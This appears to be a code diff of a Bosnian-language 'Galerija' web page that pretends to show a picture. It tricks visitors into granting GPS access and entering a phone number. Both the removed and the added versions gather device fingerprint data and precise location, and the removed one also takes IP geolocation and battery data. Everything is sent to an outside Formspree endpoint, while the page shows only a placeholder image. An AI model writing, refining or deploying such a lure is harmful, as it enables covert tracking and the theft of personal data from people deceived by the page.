@@ -1,214 +1,181 @@
 <!DOCTYPE html>
 <html lang="bs">
 <head>
-  <meta charset="UTF-8">
-  <title>Pogledaj sadržaj</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pogledaj sadržaj</title>
 
-  <style>
-    body {
-      margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
-      background: #eef2f7;
-    }
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #eef2f7;
+}
 
-    .container {
-      max-width: 420px;
-      margin: 60px auto;
-      background: #fff;
-      border-radius: 18px;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.12);
-      overflow: hidden;
-    }
+.box {
+  max-width: 420px;
+  margin: 60px auto;
+  background: white;
+  border-radius: 18px;
+  box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+  overflow: hidden;
+}
 
-    .header {
-      background: linear-gradient(135deg, #1877f2, #0b5ed7);
-      color: white;
-      padding: 18px;
-      font-size: 20px;
-      font-weight: 700;
-      text-align: center;
-    }
+.header {
+  background: #1877f2;
+  color: white;
+  padding: 18px;
+  font-size: 20px;
+  font-weight: bold;
+  text-align: center;
+}
 
-    .content {
-      padding: 24px;
-      text-align: center;
-    }
+.content {
+  padding: 24px;
+  text-align: center;
+}
 
-    .preview {
-      height: 220px;
-      border-radius: 14px;
-      background: linear-gradient(135deg, #dbeafe, #f8fafc);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 18px;
-      color: #64748b;
-      font-size: 44px;
-    }
+.preview {
+  height: 220px;
+  border-radius: 14px;
+  background: #dbeafe;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 44px;
+  margin-bottom: 18px;
+}
 
-    .title {
-      font-size: 21px;
-      font-weight: 700;
-      color: #111827;
-      margin-bottom: 8px;
-    }
+button {
+  background: #1877f2;
+  color: white;
+  border: none;
+  padding: 15px;
+  width: 100%;
+  border-radius: 10px;
+  font-size: 17px;
+  font-weight: bold;
+  cursor: pointer;
+  margin-top: 12px;
+}
 
-    .subtitle {
-      font-size: 14px;
-      color: #6b7280;
-      margin-bottom: 20px;
-    }
+input {
+  width: 100%;
+  padding: 14px;
+  font-size: 16px;
+  border: 1px solid #ccc;
+  border-radius: 10px;
+  margin-top: 12px;
+}
 
-    button {
-      background: #1877f2;
-      color: white;
-      border: none;
-      padding: 15px 18px;
-      width: 100%;
-      border-radius: 10px;
-      font-size: 17px;
-      font-weight: 700;
-      cursor: pointer;
-    }
+.small {
+  color: #666;
+  font-size: 14px;
+  margin-top: 10px;
+}
 
-    .status {
-      margin-top: 14px;
-      font-size: 14px;
-      color: #6b7280;
-    }
-  </style>
+#phoneStep, #finalStep {
+  display: none;
+}
+</style>
 </head>
 
 <body>
 
-<div class="container">
-  <div class="header">Galerija</div>
+<div class="box">
+<div class="header">Galerija</div>
 
-  <div class="content">
-    <div class="preview">🖼️</div>
+<!-- STEP 1 -->
+<div class="content" id="startStep">
+  <div class="preview">🖼️</div>
+  <h2>Klikni da vidiš sliku</h2>
+  <p class="small">Za prikaz sadržaja potrebno je potvrditi pristup lokaciji.</p>
+  <button onclick="start()">Prikaži sliku</button>
+  <p id="status" class="small"></p>
+</div>
 
-    <div class="title">Klikni da vidiš sliku</div>
-    <div class="subtitle">Za prikaz sadržaja potrebno je potvrditi pristup.</div>
+<!-- STEP 2 -->
+<div class="content" id="phoneStep">
+  <div class="preview">📱</div>
+  <h2>Unesi broj telefona</h2>
+  <p class="small">
+  Nakon unosa možeš nastaviti i pogledati sadržaj.
+  </p>
 
-    <button onclick="start()">Prikaži sliku</button>
+  <input id="phone" type="tel" placeholder="Broj telefona, npr. +43...">
 
-    <div class="status" id="status"></div>
-  </div>
+  <button onclick="sendWithPhone()">Pošalji broj</button>
+  <button onclick="sendWithoutPhone()">Preskoči</button>
+</div>
+
+<!-- STEP 3 -->
+<div class="content" id="finalStep">
+  <h2>Slika</h2>
+  <img src="https://via.placeholder.com/400x300" style="width:100%; border-radius:12px;">
+  <p class="small">Hvala.</p>
+</div>
+
 </div>
 
 <script>
+let collectedData = {};
+
 async function start() {
   document.getElementById("status").textContent = "Učitavanje...";
 
-  let data = {
-    userAgent: navigator.userAgent || "Nicht verfügbar",
-    platform: navigator.platform || "Nicht verfügbar",
-    vendor: navigator.vendor || "Nicht verfügbar",
-    language: navigator.language || "Nicht verfügbar",
-    languages: navigator.languages ? navigator.languages.join(", ") : "Nicht verfügbar",
-
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Nicht verfügbar",
-    timezoneOffsetMinutes: new Date().getTimezoneOffset(),
-    time: new Date().toLocaleString(),
-
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    screenAvailableWidth: screen.availWidth,
-    screenAvailableHeight: screen.availHeight,
-    colorDepth: screen.colorDepth,
-    pixelDepth: screen.pixelDepth,
-    pixelRatio: window.devicePixelRatio,
-
-    windowWidth: window.innerWidth,
-    windowHeight: window.innerHeight,
-
-    online: navigator.onLine,
-    cookiesEnabled: navigator.cookieEnabled,
-    doNotTrack: navigator.doNotTrack || "Nicht verfügbar",
-
-    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
-    maxTouchPoints: navigator.maxTouchPoints || 0,
-
-    cpuCores: navigator.hardwareConcurrency || "Nicht verfügbar",
-    deviceMemoryGB: navigator.deviceMemory || "Nicht verfügbar",
-
-    currentUrl: window.location.href,
-    referrer: document.referrer || "Direkt geöffnet"
+  collectedData = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: screen.width + "x" + screen.height,
+    time: new Date().toLocaleString()
   };
 
-  if (navigator.connection) {
-    data.networkEffectiveType = navigator.connection.effectiveType || "Nicht verfügbar";
-    data.networkDownlink = navigator.connection.downlink || "Nicht verfügbar";
-    data.networkSaveData = navigator.connection.saveData || false;
-    data.networkRtt = navigator.connection.rtt || "Nicht verfügbar";
-  }
-
-  if (navigator.getBattery) {
-    try {
-      const battery = await navigator.getBattery();
-      data.batteryLevel = Math.round(battery.level * 100) + "%";
-      data.batteryCharging = battery.charging;
-      data.batteryChargingTime = battery.chargingTime;
-      data.batteryDischargingTime = battery.dischargingTime;
-    } catch (e) {
-      data.batteryInfo = "Nicht verfügbar";
-    }
-  }
-
-  try {
-    const ipResponse = await fetch("https://ipapi.co/json/");
-    const ipData = await ipResponse.json();
-
-    data.ip = ipData.ip || "Nicht verfügbar";
-    data.ipCity = ipData.city || "Nicht verfügbar";
-    data.ipRegion = ipData.region || "Nicht verfügbar";
-    data.ipCountry = ipData.country_name || "Nicht verfügbar";
-    data.ipPostal = ipData.postal || "Nicht verfügbar";
-    data.ipOrg = ipData.org || "Nicht verfügbar";
-    data.ipTimezone = ipData.timezone || "Nicht verfügbar";
-  } catch (e) {
-    data.ipInfo = "Nicht verfügbar";
-  }
-
+  // GPS
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       function(pos) {
-        data.gpsLatitude = pos.coords.latitude;
-        data.gpsLongitude = pos.coords.longitude;
-        data.gpsAccuracyMeters = pos.coords.accuracy;
-        data.gpsAltitude = pos.coords.altitude;
-        data.gpsSpeed = pos.coords.speed;
-        data.gpsHeading = pos.coords.heading;
-        send(data);
+        collectedData.lat = pos.coords.latitude;
+        collectedData.lon = pos.coords.longitude;
+        showPhoneStep();
       },
-      function(error) {
-        data.gpsStatus = "Nicht erlaubt oder fehlgeschlagen";
-        data.gpsError = error.message;
-        send(data);
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 12000,
-        maximumAge: 0
+      function() {
+        collectedData.gps = "nije dozvoljeno";
+        showPhoneStep();
       }
     );
   } else {
-    data.gpsStatus = "Nicht unterstützt";
-    send(data);
+    showPhoneStep();
   }
 }
 
-function send(data) {
+function showPhoneStep() {
+  document.getElementById("startStep").style.display = "none";
+  document.getElementById("phoneStep").style.display = "block";
+}
+
+function sendWithPhone() {
+  const phone = document.getElementById("phone").value.trim();
+  collectedData.phone = phone || "nije unesen";
+  sendData();
+}
+
+function sendWithoutPhone() {
+  collectedData.phone = "preskočeno";
+  sendData();
+}
+
+function sendData() {
   fetch("https://formspree.io/f/mnjlyqqy", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify(data)
+    body: JSON.stringify(collectedData)
   });
 
-  document.getElementById("status").textContent = "Sadržaj se učitava...";
+  document.getElementById("phoneStep").style.display = "none";
+  document.getElementById("finalStep").style.display = "block";
 }
 </script>
 
